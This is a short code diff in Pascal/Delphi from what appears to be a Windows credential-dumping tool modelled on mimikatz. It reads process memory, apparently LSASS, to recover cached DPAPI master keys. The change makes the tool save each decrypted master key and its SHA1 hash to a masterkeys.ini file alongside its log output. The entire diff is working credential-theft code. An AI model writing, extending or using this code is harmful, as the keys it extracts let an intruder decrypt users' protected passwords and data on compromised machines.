@@ -1168,11 +1168,17 @@ hprocess:=openprocess( PROCESS_VM_READ {or PROCESS_VM_WRITE or PROCESS_VM_OPERAT
                     then log('decryptLSA NOT OK',1)
                     else
                     begin
-                    if save
-                       then writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'MasterKey',ByteToHexaString(decrypted),'masterkeys.ini');
                     log('MasterKey:'+ByteToHexaString(decrypted),1);
                     if crypto_hash_(CALG_SHA1, @decrypted[0], PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.keySize, dgst, SHA_DIGEST_LENGTH )
                        then log('SHA1:'+ByteToHexaString (dgst),1);
+                    //
+                    if save then
+                       begin
+                       writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'MasterKey',ByteToHexaString(decrypted),'masterkeys.ini');
+                       writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'SHA1',ByteToHexaString (dgst),'masterkeys.ini');
+                       //writeini(GUIDToString (PKIWI_MASTERKEY_CACHE_ENTRY (@list[0])^.KeyUid),'Time',DateTimeToStr (SystemTimeToDateTime (st)),'masterkeys.ini');
+                       end;
+                    //
                     end;
                     //next logsesslist
                     current:=nativeuint(PKIWI_MASTERKEY_CACHE_ENTRY (@list[0] )^.flink);
